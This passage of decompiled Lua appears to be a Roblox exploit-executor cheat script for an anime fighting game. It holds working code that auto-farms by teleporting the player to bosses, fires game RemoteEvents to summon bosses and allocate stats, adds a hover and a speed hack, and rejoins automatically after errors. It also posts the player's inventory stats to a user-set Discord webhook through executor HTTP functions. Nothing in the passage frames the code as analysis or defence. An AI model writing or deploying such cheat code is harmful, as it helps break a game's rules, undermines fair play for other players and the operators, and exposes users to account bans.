        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue2 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue3 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue2 = iteratorValue3
            end
            if hasNext then
                if not iteratorValue2 then
                    if not findFirstChildResult2 then
                        continue
                    end
                else
                    iteratorValue = iteratorValue2
                    findFirstChildResult3 = iteratorValue.FindFirstChild(iteratorValue, textValue)
                    if not findFirstChildResult3 then
                        if not findFirstChildResult2 then
                            continue
                        end
                    else
                        findFirstChildResult4 = findFirstChildResult3
                        if
                            not (findFirstChildResult4.FindFirstChild(findFirstChildResult4, "Humanoid"))
                            or not (0 < findFirstChildResult3.Humanoid.Health)
                        then
                            if not findFirstChildResult2 then
                                continue
                            end
                        else
                            findFirstChildResult = findFirstChildResult3
                            if
                                not (
                                    findFirstChildResult.FindFirstChild(
                                        findFirstChildResult,
                                        "HumanoidRootPart"
                                    )
                                )
                            then
                                if not findFirstChildResult2 then
                                    continue
                                end
                            else
                                find = environment.string.find
                                name = findFirstChildResult3.Name
                                if not (find((name.lower(name)), "dummy")) then
                                    findFirstChildResult2 = findFirstChildResult3
                                else
                                    if not findFirstChildResult2 then
                                        continue
                                    end
                                end
                            end
                        end
                    end
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        if findFirstChildResult2 then
            capturedCallback8((capturedCallback13(findFirstChildResult2.HumanoidRootPart)))
            if not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup) then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback11(closureEnvironment, capturedTextValueState5)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedTextValueState5.value = argument1
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine77(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if
                not (
                    not capturedOptions.AutoSummonSaberAlter
                    or not capturedOptions.AutoSummonSaberAlter.Value
                )
            then
                environment.pcall(functions.handleWaitForChildAtLine123(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine123(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        items = runtime.create(2)
        runtime.move({ "SaberAlterBoss", environment._G.SelectedSaberAlterDifficulty }, 1, 2, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "RequestSummonBoss"))
        fireServer = value3.FireServer
        callResults = runtime.pack(environment.unpack(items))
        fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        return
    end, closureEnvironment)
end

function functions.callback2(closureEnvironment, capturedTextValueState6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local tonumberResult
        tonumberResult = environment.tonumber(argument1)
        if not tonumberResult then
            tonumberResult = 1
        end
        capturedTextValueState6.value = tonumberResult
        return
    end, closureEnvironment)
end

function functions.handleCallback12(closureEnvironment, capturedCallback16)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedCallback16(argument1)
        return
    end, closureEnvironment)
end

function functions.handleWarn(
    closureEnvironment,
    capturedLocalPlayer,
    capturedCallback,
    capturedCallback2,
    capturedGetServiceResult
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, callResults5, callResults6, embeds, fields, footer, items, items2, items3
        local items4, items5, items6, items7, items8, items9, jSONEncode, jSONEncodeResult, request, text, textValueState, thumbnail
        local url, username, value, value10, value11, value12, value13, value14, value2, value3, value4, value5
        local value6, value7, value8, value9, webhookURL
        textValueState = {}
        webhookURL = environment._G.WebhookURL
        if webhookURL == "" then
            return
        else
            textValueState.value = "0"
            environment.pcall(
                functions.handleTostringAtLine6(environment, textValueState, capturedLocalPlayer)
            )
            fields = runtime.create(7)
            items = {}
            items.name = "✨ Aura Crate"
            value = capturedCallback
            callResults = runtime.pack(capturedCallback2("Aura Crate"))
            value2 = value(runtime.unpack(callResults, 1, (((callResults.n + 6) - 1) - 5)))
            items.value = value2
            items.inline = true
            items2 = {}
            items2.name = "📦 Secret Chest"
            value3 = capturedCallback
            callResults2 = runtime.pack(capturedCallback2("Secret Chest"))
            value4 = value3(runtime.unpack(callResults2, 1, (((callResults2.n + 7) - 1) - 6)))
            items2.value = value4
            items2.inline = true
            items3 = {}
            items3.name = "🧾 Calamity Seal"
            value5 = capturedCallback
            callResults3 = runtime.pack(capturedCallback2("Calamity Seal"))
            value6 = value5(runtime.unpack(callResults3, 1, (((callResults3.n + 8) - 1) - 7)))
            items3.value = value6
            items3.inline = true
            items4 = {}
            items4.name = "🧾 Clan Reroll"
            value7 = capturedCallback
            callResults4 = runtime.pack(capturedCallback2("Clan Reroll"))
            value8 = value7(runtime.unpack(callResults4, 1, (((callResults4.n + 9) - 1) - 8)))
            items4.value = value8
            items4.inline = true
            items5 = {}
            items5.name = "🧾 Race Reroll"
            value9 = capturedCallback
            callResults5 = runtime.pack(capturedCallback2("Race Reroll"))
            value10 = value9(runtime.unpack(callResults5, 1, (((callResults5.n + 10) - 1) - 9)))
            items5.value = value10
            items5.inline = true
            items6 = {}
            items6.name = "🌟 Trait Reroll"
            value11 = capturedCallback
            callResults6 = runtime.pack(capturedCallback2("Trait Reroll"))
            value12 = value11(runtime.unpack(callResults6, 1, (((callResults6.n + 11) - 1) - 10)))
            items6.value = value12
            items6.inline = true
            items7 = {}
            items7.name = "💰 Current Money"
            value13 = capturedCallback(textValueState.value)
            items7.value = value13
            items7.inline = true
            runtime.move({ items, items2, items3, items4, items5, items6, items7 }, 1, 7, 1, fields)
            items8 = {}
            items8.title = "📊 สรุปสถิติไอเทมตัวละคร"
            items8.color = 16711680
            items8.fields = fields
            footer = {}
            text = ("อัปเดตเมื่อ: " .. (environment.os.date("%H:%M:%S")))
            footer.text = text
            items8.footer = footer
            thumbnail = {}
            url = (
                "https://www.roblox.com/headshot-thumbnail/image?userId="
                .. (capturedLocalPlayer.UserId .. "&width=420&height=420&format=png")
            )
            thumbnail.url = url
            items8.thumbnail = thumbnail
            value14 = capturedGetServiceResult
            jSONEncode = value14.JSONEncode
            items9 = {}
            username = (capturedLocalPlayer.DisplayName .. " Stats")
            items9.username = username
            embeds = runtime.create(1)
            runtime.move({ items8 }, 1, 1, 1, embeds)
            items9.embeds = embeds
            jSONEncodeResult = jSONEncode(value14, items9)
            request = environment.syn
            if request then
                request = environment.syn.request
            end
            if not request then
                request = environment.http
                if request then
                    request = environment.http.request
                end
            end
            if not request then
                request = environment.http_request
            end
            if not request then
                request = environment.fluxus
                if request then
                    request = environment.fluxus.request
                end
            end
            if not request then
                request = environment.request
            end
            if not request then
                environment.warn("Your Executor does not support HTTP requests!")
            else
                environment.task.spawn(
                    functions.handlePcallAtLine41(environment, request, webhookURL, jSONEncodeResult)
                )
            end
            return
        end
    end, closureEnvironment)
end

function functions.handlePcallAtLine41(
    closureEnvironment,
    capturedRequest,
    capturedWebhookURL,
    capturedJSONEncodeResult
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(
            functions.handleCallbackAtLine92(
                environment,
                capturedRequest,
                capturedWebhookURL,
                capturedJSONEncodeResult
            )
        )
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine92(
    closureEnvironment,
    capturedRequest,
    capturedWebhookURL,
    capturedJSONEncodeResult
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local headers, items, value
        value = capturedRequest
        items = {}
        items.Url = capturedWebhookURL
        items.Method = "POST"
        headers = {}
        headers["Content-Type"] = "application/json"
        items.Headers = headers
        items.Body = capturedJSONEncodeResult
        value(items)
        return
    end, closureEnvironment)
end

function functions.handleTostringAtLine6(closureEnvironment, capturedTextValueState, capturedLocalPlayer)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local tostringResult
        tostringResult = environment.tostring(capturedLocalPlayer.Data.Money.Value)
        capturedTextValueState.value = tostringResult
        return
    end, closureEnvironment)
end

function functions.handleCallback13(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedSummonV2Boss = ...
        local gValue
        gValue = environment._G
        gValue.SelectedSummonV2Boss = selectedSummonV2Boss
        return
    end, closureEnvironment)
end

function functions.handleCallback14(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedTrueAizenDifficulty = ...
        local gValue
        gValue = environment._G
        gValue.SelectedTrueAizenDifficulty = selectedTrueAizenDifficulty
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine34(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.pcall(functions.handleGetServiceAtLine16(environment))
        return
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine16(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local errorMessageChanged, gameValue, gameValue2, gameValue3, guiService, players, teleportService
        gameValue = environment.game
        guiService = gameValue.GetService(gameValue, "GuiService")
        gameValue2 = environment.game
        teleportService = gameValue2.GetService(gameValue2, "TeleportService")
        gameValue3 = environment.game
        players = gameValue3.GetService(gameValue3, "Players")
        errorMessageChanged = guiService.ErrorMessageChanged
        errorMessageChanged.Connect(
            errorMessageChanged,
            functions.handleWaitAtLine79(environment, teleportService, players)
        )
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine79(closureEnvironment, capturedTeleportService, capturedPlayers)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        environment.task.wait(0.5)
        value = capturedTeleportService
        value.Teleport(value, environment.game.PlaceId, capturedPlayers.LocalPlayer)
        return
    end, closureEnvironment)
end

function functions.values(closureEnvironment, capturedOptions, capturedTextValueState5, capturedItemsState3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2, iteratorValue, iteratorValue2, result
        local savedIterations, savedIterations2
        while true do
            environment.task.wait(0.5)
            if not ((not capturedOptions.AutoStats) or not capturedOptions.AutoStats.Value) then
                if (environment["type"](capturedTextValueState5.value)) == "table" then
                    callResults = runtime.pack(environment.pairs(capturedTextValueState5.value))
                    callResults2 = callResults
                    savedIterations =
                        { savedIterations2, [5] = iterationStep, iterationLimit, iterationCursor2 }
                    result = runtime.wrapIterator(runtime.iteratorBody1)
                    result(callResults2[1], callResults2[2], callResults2[3])
                    iteratorKey2 = nil
                    iteratorValue2 = nil
                    iterationCursor = result
                    while true do
                        hasNext, iteratorKey, iteratorValue = iterationCursor()
                        if not hasNext then
                        else
                            iteratorKey2 = iteratorKey
                            iteratorValue2 = iteratorValue
                        end
                        if hasNext then
                            if iteratorValue2 then
                                environment.pcall(
                                    functions.handleWaitForChildAtLine60(
                                        environment,
                                        iteratorKey2,
                                        capturedItemsState3
                                    )
                                )
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor2 = savedIterations[3]
                    iterationLimit = savedIterations[2]
                    iterationStep = savedIterations[5]
                    savedIterations2 = savedIterations[1]
                else
                    if (environment["type"](capturedTextValueState5.value)) == "string" then
                        environment.pcall(
                            functions.handleWaitForChildAtLine14(
                                environment,
                                capturedTextValueState5,
                                capturedItemsState3
                            )
                        )
                    end
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine14(
    closureEnvironment,
    capturedTextValueState5,
    capturedItemsState3
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "RemoteEvents"))
        value3 = (value2.WaitForChild(value2, "AllocateStat"))
        value3.FireServer(value3, capturedTextValueState5.value, capturedItemsState3.value)
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine60(closureEnvironment, capturedIteratorKey2, capturedItemsState3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "RemoteEvents"))
        value3 = (value2.WaitForChild(value2, "AllocateStat"))
        value3.FireServer(value3, capturedIteratorKey2, capturedItemsState3.value)
        return
    end, closureEnvironment)
end

function functions.handleCallback15(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectIslandTP = ...
        local gValue
        gValue = environment._G
        gValue.SelectIslandTP = selectIslandTP
        return
    end, closureEnvironment)
end

function functions.handleNew4(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local callback
        if argument1 == true then
            callback = functions.handleCallbackAtLine43(
                environment,
                capturedCallback9,
                (
                    environment.CFrame.new(
                        -1283.02942,
                        1603.61951,
                        1751.08313,
                        0.358377755,
                        0,
                        -0.933576643,
                        0,
                        1,
                        0,
                        0.933576643,
                        0,
                        0.358377755
                    )
                )
            )
            environment.task.spawn(callback)
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine43(closureEnvironment, capturedCallback9, capturedSharedValue)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback9(capturedSharedValue.Position)
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine21(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if
                not (
                    not capturedOptions.AutoSummonTrueAizen or not capturedOptions.AutoSummonTrueAizen.Value
                )
            then
                environment.pcall(functions.handleWaitForChildAtLine113(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine113(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        items = runtime.create(1)
        runtime.move({ environment._G.SelectedTrueAizenDifficulty }, 1, 1, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "RemoteEvents"))
        value3 = (value2.WaitForChild(value2, "RequestSpawnTrueAizen"))
        fireServer = value3.FireServer
        callResults = runtime.pack(environment.unpack(items))
        fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        return
    end, closureEnvironment)
end

function functions.handleNew5(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, numberValue
        argument12 = argument1
        if environment._G.FarmPosition == "Behind" then
            return (argument12.CFrame * (environment.CFrame.new(0, 0, environment._G.FarmDistanceBehind)))
        else
            numberValue = (
                argument12.Position + (environment.Vector3.new(0, environment._G.FarmDistanceAbove, 0))
            )
            return (
                (environment.CFrame.new(numberValue))
                * (environment.CFrame.Angles((environment.math.rad(-90)), 0, 0))
            )
        end
    end, closureEnvironment)
end

function functions.handleGetAttribute(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local data, leaderstats, localPlayer, localPlayer2, localPlayer3, localPlayer4, localPlayer5, localPlayer6, localPlayer7, localPlayer8, localPlayer9
        localPlayer9 = environment.game.Players.LocalPlayer
        localPlayer = localPlayer9
        if not (localPlayer.GetAttribute(localPlayer, "Clan")) then
            localPlayer4 = localPlayer9
            if not (localPlayer4.GetAttribute(localPlayer4, "cerrenrclan")) then
                localPlayer3 = localPlayer9
                if not (localPlayer3.GetAttribute(localPlayer3, "CurrentClan")) then
                    localPlayer6 = localPlayer9
                    if not (localPlayer6.FindFirstChild(localPlayer6, "Data")) then
                        localPlayer2 = localPlayer9
                        if not (localPlayer2.FindFirstChild(localPlayer2, "leaderstats")) then
                            return "None"
                        else
                            leaderstats = localPlayer9.leaderstats
                            if not (leaderstats.FindFirstChild(leaderstats, "Clan")) then
                                return "None"
                            else
                                return localPlayer9.leaderstats.Clan.Value
                            end
                        end
                    else
                        data = localPlayer9.Data
                        if not (data.FindFirstChild(data, "Clan")) then
                            localPlayer2 = localPlayer9
                            if not (localPlayer2.FindFirstChild(localPlayer2, "leaderstats")) then
                                return "None"
                            else
                                leaderstats = localPlayer9.leaderstats
                                if not (leaderstats.FindFirstChild(leaderstats, "Clan")) then
                                    return "None"
                                else
                                    return localPlayer9.leaderstats.Clan.Value
                                end
                            end
                        else
                            return localPlayer9.Data.Clan.Value
                        end
                    end
                else
                    localPlayer5 = localPlayer9
                    return localPlayer5.GetAttribute(localPlayer5, "CurrentClan")
                end
            else
                localPlayer7 = localPlayer9
                return localPlayer7.GetAttribute(localPlayer7, "cerrenrclan")
            end
        else
            localPlayer8 = localPlayer9
            return localPlayer8.GetAttribute(localPlayer8, "Clan")
        end
    end, closureEnvironment)
end

function functions.handleGetAttributeAtLine52(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local data, leaderstats, localPlayer, localPlayer2, localPlayer3, localPlayer4, localPlayer5, localPlayer6, localPlayer7, localPlayer8, localPlayer9
        localPlayer2 = environment.game.Players.LocalPlayer
        localPlayer3 = localPlayer2
        if not (localPlayer3.GetAttribute(localPlayer3, "Race")) then
            localPlayer6 = localPlayer2
            if not (localPlayer6.GetAttribute(localPlayer6, "cerrenrace")) then
                localPlayer8 = localPlayer2
                if not (localPlayer8.GetAttribute(localPlayer8, "CurrentRace")) then
                    localPlayer7 = localPlayer2
                    if not (localPlayer7.FindFirstChild(localPlayer7, "Data")) then
                        localPlayer5 = localPlayer2
                        if not (localPlayer5.FindFirstChild(localPlayer5, "leaderstats")) then
                            return "None"
                        else
                            leaderstats = localPlayer2.leaderstats
                            if not (leaderstats.FindFirstChild(leaderstats, "Race")) then
                                return "None"
                            else
                                return localPlayer2.leaderstats.Race.Value
                            end
                        end
                    else
                        data = localPlayer2.Data
                        if not (data.FindFirstChild(data, "Race")) then
                            localPlayer5 = localPlayer2
                            if not (localPlayer5.FindFirstChild(localPlayer5, "leaderstats")) then
                                return "None"
                            else
                                leaderstats = localPlayer2.leaderstats
                                if not (leaderstats.FindFirstChild(leaderstats, "Race")) then
                                    return "None"
                                else
                                    return localPlayer2.leaderstats.Race.Value
                                end
                            end
                        else
                            return localPlayer2.Data.Race.Value
                        end
                    end
                else
                    localPlayer4 = localPlayer2
                    return localPlayer4.GetAttribute(localPlayer4, "CurrentRace")
                end
            else
                localPlayer9 = localPlayer2
                return localPlayer9.GetAttribute(localPlayer9, "cerrenrace")
            end
        else
            localPlayer = localPlayer2
            return localPlayer.GetAttribute(localPlayer, "Race")
        end
    end, closureEnvironment)
end

function functions.handlePcallAtLine79(closureEnvironment, capturedSharedValueState4, capturedEnabledState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        if not ((not capturedSharedValueState4.value) or capturedEnabledState.value) then
            capturedEnabledState.value = true
            environment.pcall(functions.handleFireServerAtLine32(environment, capturedSharedValueState4))
            environment.task.delay(0.15, functions.handleCallbackAtLine942(environment, capturedEnabledState))
        end
        return
    end, closureEnvironment)
end

function functions.handleFireServerAtLine32(closureEnvironment, capturedSharedValueState4)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gValue, lastActiveAttack, value
        value = capturedSharedValueState4.value
        value.FireServer(value)
        gValue = environment._G
        lastActiveAttack = environment.tick()
        gValue.LastActiveAttack = lastActiveAttack
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine942(closureEnvironment, capturedEnabledState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedEnabledState.value = false
        return
    end, closureEnvironment)
end

function functions.handleNew6(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local instanceObject, maxForce, parent, parent2, velocity
        parent = argument1
        parent2 = parent
        if not (parent2.FindFirstChild(parent2, "TurboHover")) then
            instanceObject = environment.Instance.new("BodyVelocity")
            instanceObject.Name = "TurboHover"
            maxForce =
                environment.Vector3.new(environment.math.huge, environment.math.huge, environment.math.huge)
            instanceObject.MaxForce = maxForce
            velocity = environment.Vector3.zero
            instanceObject.Velocity = velocity
            instanceObject.Parent = parent
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild3(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, argument13, argument14, turboGyro, turboHover
        argument12 = argument1
        argument13 = argument12
        if argument13.FindFirstChild(argument13, "TurboHover") then
            turboHover = argument12.TurboHover
            turboHover.Destroy(turboHover)
        end
        argument14 = argument12
        if argument14.FindFirstChild(argument14, "TurboGyro") then
            turboGyro = argument12.TurboGyro
            turboGyro.Destroy(turboGyro)
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback16(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedDifficultyAnos = ...
        local gValue
        gValue = environment._G
        gValue.SelectedDifficultyAnos = selectedDifficultyAnos
        return
    end, closureEnvironment)
end

function functions.handleSetValue(closureEnvironment, capturedResult13)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local interfaceTheme, transparentToggle
        if capturedResult13.Options.InterfaceTheme then
            interfaceTheme = capturedResult13.Options.InterfaceTheme
            interfaceTheme.SetValue(interfaceTheme, "Darker")
        end
        if capturedResult13.Options.TransparentToggle then
            transparentToggle = capturedResult13.Options.TransparentToggle
            transparentToggle.SetValue(transparentToggle, false)
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine2565(closureEnvironment, capturedTextValueState, capturedResult13)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local items, notify, value, value2
        if capturedTextValueState.value then
            value = capturedTextValueState.value
            value.FireServer(value, "ShadowQuestlineBuff")
        end
        value2 = capturedResult13
        notify = value2.Notify
        items = {}
        items.Title = "Quest"
        items.Content = "Accepted Shadow Quest"
        items.Duration = 3
        notify(value2, items)
        return
    end, closureEnvironment)
end

function functions.handlePcallAtLine19(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if
                not ((not capturedOptions.AutoSummonBossAnos) or not capturedOptions.AutoSummonBossAnos.Value)
            then
                environment.pcall(functions.handleWaitForChildAtLine40(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine40(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, requestSpawnAnosBoss, requestSpawnAnosBoss2, value, value2
        items = runtime.create(2)
        runtime.move({ "Anos", environment._G.SelectedDifficultyAnos }, 1, 2, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        requestSpawnAnosBoss = value2.WaitForChild(value2, "RequestSpawnAnosBoss")
        if requestSpawnAnosBoss then
            requestSpawnAnosBoss2 = requestSpawnAnosBoss
            fireServer = requestSpawnAnosBoss2.FireServer
            callResults = runtime.pack(environment.unpack(items))
            fireServer(requestSpawnAnosBoss2, runtime.unpack(callResults, 1, (((callResults.n + 5) - 1) - 4)))
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild4(closureEnvironment, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local character, gValue, humanoid, speedEnabled
        speedEnabled = argument1
        gValue = environment._G
        gValue.SpeedEnabled = speedEnabled
        if (not speedEnabled) and capturedLocalPlayer2.Character then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "Humanoid") then
                humanoid = capturedLocalPlayer2.Character.Humanoid
                humanoid.WalkSpeed = 16
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleLower(closureEnvironment, capturedCallback, capturedCallback4)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, callResults3, find, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2
        local iteratorValue, iteratorValue2, lowerResult, result, savedIterations, savedIterations2
        argument12 = argument1
        if not environment._G.GlobalChatAlert[argument12] then
            callResults2 = runtime.pack(environment.pairs(environment._G.GlobalBossStates))
            callResults3 = callResults2
            savedIterations2 = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults3[1], callResults3[2], callResults3[3])
            iteratorKey2 = nil
            iteratorValue2 = nil
            iterationCursor2 = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor2()
                if not hasNext then
                else
                    iteratorKey2 = iteratorKey
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if not iteratorValue2 then
                        continue
                    else
                        find = environment.string.find
                        lowerResult = environment.string.lower(argument12)
                        callResults = runtime.pack(environment.string.lower(iteratorKey2))
                        if
                            not (
                                find(
                                    lowerResult,
                                    runtime.unpack(callResults, 1, (((callResults.n + 7) - 1) - 6))
                                )
                            )
                        then
                            continue
                        else
                            return true
                        end
                    end
                end
                break
            end
            iterationCursor = savedIterations2[3]
            iterationLimit = savedIterations2[2]
            iterationStep = savedIterations2[5]
            savedIterations = savedIterations2[1]
            if not (capturedCallback(argument12)) then
                if not (capturedCallback4(argument12)) then
                    return false
                else
                    return true
                end
            else
                return true
            end
        else
            return true
        end
    end, closureEnvironment)
end

function functions.handleCallback17(closureEnvironment, capturedNumberValueState3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local argument22
        argument22 = argument2
        if argument1 == "Items" then
            capturedNumberValueState3.value = argument22
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine12(
    closureEnvironment,
    capturedOptions,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    ((not capturedOptions.AutoKillTrueAizen) or not capturedOptions.AutoKillTrueAizen.Value)
                    or environment._G.IsPortaling
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine56(
                        environment,
                        capturedClonerefResult,
                        capturedCallback13,
                        capturedCallback8,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine56(
    closureEnvironment,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, enemies, find, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, hasNext, items, items2
        local iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, name, result
        local savedIterations, savedIterations2, textValue, value, value2, value3, value4, value5
        textValue = ("TrueAizenBoss_" .. environment._G.SelectedTrueAizenDifficulty)
        findFirstChildResult3 = nil
        items = runtime.create(4)
        value = capturedClonerefResult
        value2 = capturedClonerefResult
        enemies = value2.FindFirstChild(value2, "Enemies")
        value3 = capturedClonerefResult
        mobs = value3.FindFirstChild(value3, "Mobs")
        value4 = capturedClonerefResult
        nPCs = value4.FindFirstChild(value4, "NPCs")
        value5 = capturedClonerefResult
        callResults = runtime.pack(value5.FindFirstChild(value5, "Npcs"))
        items2 = items
        runtime.move({ value, enemies, mobs, nPCs }, 1, 4, 1, items2)
        runtime.move(callResults, 1, (((callResults.n + 8) - 1) - 7), 5, items2)
        callResults2 = runtime.pack(environment.pairs(items))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue3 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue2 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue3 = iteratorValue2
            end
            if hasNext then
                if not iteratorValue3 then
                    if not findFirstChildResult3 then
                        continue
                    end
                else
                    iteratorValue = iteratorValue3
                    findFirstChildResult = iteratorValue.FindFirstChild(iteratorValue, textValue)
                    if not findFirstChildResult then
                        if not findFirstChildResult3 then
                            continue
                        end
                    else
                        findFirstChildResult4 = findFirstChildResult
                        if
                            not (findFirstChildResult4.FindFirstChild(findFirstChildResult4, "Humanoid"))
                            or not (0 < findFirstChildResult.Humanoid.Health)
                        then
                            if not findFirstChildResult3 then
                                continue
                            end
                        else
                            findFirstChildResult2 = findFirstChildResult
                            if
                                not (
                                    findFirstChildResult2.FindFirstChild(
                                        findFirstChildResult2,
                                        "HumanoidRootPart"
                                    )
                                )
                            then
                                if not findFirstChildResult3 then
                                    continue
                                end
                            else
                                find = environment.string.find
                                name = findFirstChildResult.Name
                                if not (find((name.lower(name)), "dummy")) then
